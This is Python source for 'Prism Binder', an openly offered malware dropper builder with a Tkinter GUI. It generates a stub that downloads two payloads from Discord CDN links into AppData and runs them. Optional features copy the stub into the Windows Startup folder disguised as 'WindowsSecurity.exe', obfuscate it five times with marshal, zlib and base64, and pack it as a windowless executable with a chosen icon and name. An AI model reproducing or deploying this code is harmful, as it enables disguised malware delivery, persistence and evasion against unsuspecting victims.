# Prism Python Binder by vesper#0003
# follow my ig ' i_might_be_vesper ' or gay

import os
import marshal
import zlib
import base64
import shutil
from tkinter import *
from tkinter import messagebox
from tkinter.filedialog import askopenfilename
from time import sleep

window = Tk()
window.title("Prism Binder || vesper#0003")
window.geometry("747x645")
window.maxsize(747, 645)
window.minsize(747, 645)
window.iconbitmap("assets/mylogo.ico")
window.config(background='#151414')

backg = PhotoImage(file="assets/background.png")
browse = PhotoImage(file="assets/img0.png")
bind = PhotoImage(file="assets/img3.png")
blankbu = PhotoImage(file="assets/blankbu.png")
fullbu = PhotoImage(file="assets/fullbu.png")

class Prism:
    def __init__(self):
        self.obfuscateon = False
        self.addstartupon = False
        self.isiconon = False
        self.isnameon = False
        self.startupcode = ''
        self.main()
    def yesobfuscate(self):
        if self.obfuscateon == False:
            self.obfuscateon = True
            self.obf.config(image=fullbu)
        else:
            self.obfuscateon = False
            self.obf.config(image=blankbu)
    def yesaddstartup(self):
        if self.addstartupon == False:
            self.addstartupon = True
            self.ats.config(image=fullbu)
            self.startupcode = r"""
file = argv[0]
try:
    poop = open(file, 'rb')
    okpoopinpants = poop.read()
    with open(f'C:\\Users\\{user}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\WindowsSecurity.exe', 'wb') as f:
        f.write(okpoopinpants)
except:pass       
            """
        else:
            self.addstartupon = False
            self.ats.config(image=blankbu)
            self.startupcode = ''
    def monkeyicon(self):
        if self.isiconon == False:
            self.isiconon = True
            self.ico.config(image=fullbu)
        else:
            self.isiconon = False
            self.ico.config(image=blankbu)
    def iconlol(self):
        filename = askopenfilename(filetypes=(("ico files","*.ico"),("All files","*.*")))
        self.icon.insert(END,filename)
    def monkeyname(self):
        if self.isnameon == False:
            self.isnameon = True
            self.na.config(image=fullbu)
        else:
            self.isnameon = False
            self.na.config(image=blankbu)
    def createfilerq(self):
        file1 = self.file1.get()
        file2 = self.file2.get()
        name = self.name.get()
        if len(name) < 1:
            name = 'Binded'
        with open(name+'.py', 'w+') as f:
            f.write(fr"""
import os
import requests
import getpass
import threading
from sys import argv

user = getpass.getuser()
file1 = "{file1}"
file2 = "{file2}"
{self.startupcode}
""")
            f.write(r"""
def runfile1():
    ext = file1.split("/")[6].split(".")[-1]
    filename = file1.split("/")[6].split('.')[:-1]
    filename = filename[0]
    if os.path.exists(f'C:\\Users\\{user}\\AppData\\Roaming\\{filename}.{ext}'):
        os.system(f'start C:\\Users\\{user}\\AppData\\Roaming\\{filename}.{ext}')
    else:
        myfile = requests.get(file1)
        open(f"C:\\Users\\{user}\\AppData\\Roaming\\{filename}.{ext}", "wb").write(myfile.content)
        os.system(f'start C:\\Users\\{user}\\AppData\\Roaming\\{filename}.{ext}')

def runfile2():
    ext2 = file2.split("/")[6].split(".")[-1]
    filename2 = file2.split("/")[6].split('.')[:-1]
    filename2 = filename2[0]
    if os.path.exists(f'C:\\Users\\{user}\\AppData\\Roaming\\{filename2}.{ext2}'):
        os.system(f'start C:\\Users\\{user}\\AppData\\Roaming\\{filename2}.{ext2}')
    else:
        myfile2 = requests.get(file2)
        open(f"C:\\Users\\{user}\\AppData\\Roaming\\{filename2}.{ext2}", "wb").write(myfile2.content)
        os.system(f'start C:\\Users\\{user}\\AppData\\Roaming\\{filename2}.{ext2}')

t1 = threading.Thread(target=runfile1)
t2 = threading.Thread(target=runfile2)
t1.start()
t2.start()        
            """)
        return True
    def makeexe(self):
        if self.isiconon == True:
            icon = self.icon.get()
        name = self.name.get()
        if len(name) < 1:
            name = 'Binded'
        try:
            if self.isiconon ==True:
                os.system(f"""pyinstaller --onefile --noconsole --icon {icon} --name {name} --hidden-import="requests" {name}.py""")
            else:
                os.system(f"""pyinstaller --onefile --noconsole --name {name} --hidden-import="requests" {name}.py""")
            shutil.move(f"{os.getcwd()}\\dist\\{name}.exe", f"{os.getcwd()}\\{name}.exe")
            shutil.rmtree('build')
            shutil.rmtree('dist')
            shutil.rmtree('__pycache__')
            os.remove(f'{name}.spec')
            os.remove(f"{name}.py")
            messagebox.showinfo('Prism Binder || vesper#0003', 'File Created!')
        except:
            shutil.rmtree('build')
            shutil.rmtree('dist')
            shutil.rmtree('__pycache__')
            os.remove(f'{name}.spec')
            os.remove(f"{name}.py")
            messagebox.showerror('Prism Binder || vesper#0003', f'Error Ocurred. Make sure every requirements are installed.')
        self.__init__()
    def obfuscatethatbih(self):
        name = self.name.get()
        if len(name) < 1:
            name = 'Binded'
        for _ in range(5):
            with open(name+".py", 'r') as f:
                mysrc = f.read()
            marsrc = compile(mysrc, 'coduter', 'exec')
            encode1 = marshal.dumps(marsrc)
            encode2 = zlib.compress(encode1)
            encode3 = base64.b64encode(encode2)
            with open(name+".py", 'w') as f:
                f.write('import marshal, zlib, base64')
                f.write(f"\nexec(marshal.loads(zlib.decompress(base64.b64decode({encode3}))))")
                f.close()
        return True
    def verify(self):
        penis = False
        file1  =self.file1.get()
        file2  =self.file2.get()
        icon = self.icon.get()
        name = self.name.get()
        while True:
            if "https://cdn.discordapp.com/attachments/" not in file1:
                messagebox.showerror('Prism Binder || vesper#0003', f'Invalid Discord direct link');penis=False;break
            else:pass
            if "https://cdn.discordapp.com/attachments/" not in file2:
                messagebox.showerror('Prism Binder || vesper#0003', f'Invalid Discord direct link');penis=False;break
            else:pass
            if self.isiconon == True:
                if os.path.exists(icon):pass
                else:messagebox.showerror('Prism Binder || vesper#0003', f'Couldnt find the icon {icon}');penis=False;break
            if self.isnameon == True:
                if len(name) > 0:pass
                else:messagebox.showerror('Prism Binder || vesper#0003', f'Invalid Name! Do not use spaces in your name.');penis=False;break
            penis = True
            break
        if penis == True:
            if self.createfilerq() == True:
                if self.obfuscateon == True:
                    if self.obfuscatethatbih() == True:
                        self.makeexe()
                else:
                    self.makeexe()

    def main(self):
        thisisthebackground = Label(window, image=backg, borderwidth=0)
        thisisthebackground.place(x=0,y=0)
        self.file1 = Entry(window,font=('SeoulHangang',10),bg='#A3A3A3', fg='#2B12C6',width=67,borderwidth=0)
        self.file1.place(x=122, y=199)
        self.file2 = Entry(window,font=('SeoulHangang',10),bg='#A3A3A3', fg='#2B12C6',width=67,borderwidth=0)
        self.file2.place(x=122, y=259)
        self.obf = Button(window, image=blankbu,bg='#08061B',borderwidth=0, activebackground="#08061B",command=self.yesobfuscate)
        self.obf.place(x=254,y=312)
        self.ats = Button(window, image=blankbu,bg='#08061B',borderwidth=0, activebackground="#08061B",command=self.yesaddstartup)
        self.ats.place(x=528,y=312)
        self.ico = Button(window, image=blankbu,bg='#08061B',borderwidth=0, activebackground="#08061B",command=self.monkeyicon)
        self.ico.place(x=254,y=408)
        self.icon = Entry(window,font=('SeoulHangang',10),bg='#A3A3A3', fg='#2B12C6',width=17,borderwidth=0)
        self.icon.place(x=122, y=471)
        browse3 = Button(window, image=browse,bg='#08061B',borderwidth=0, activebackground="#08061B",command=self.iconlol)
        browse3.place(x=253,y=466)
        self.na = Button(window, image=blankbu,bg='#08061B',borderwidth=0, activebackground="#08061B",command=self.monkeyname)
        self.na.place(x=528,y=408)
        self.name = Entry(window,font=('SeoulHangang',10),bg='#A3A3A3', fg='#2B12C6',width=28,borderwidth=0)
        self.name.place(x=403, y=471)
        binder = Button(window, image=bind,bg='#08061B',borderwidth=0, activebackground="#08061B",command=self.verify)
        binder.place(x=307,y=563)

# oh hi, dont skid this code :P
messagebox.showinfo('Prism Binder || vesper#0003', 'Welcome to Prism. Make sure the name used for the stub doesnt have a space. Also, please watch the video tutorial on how to get your discord direct link.')
Prism()
window.mainloop()
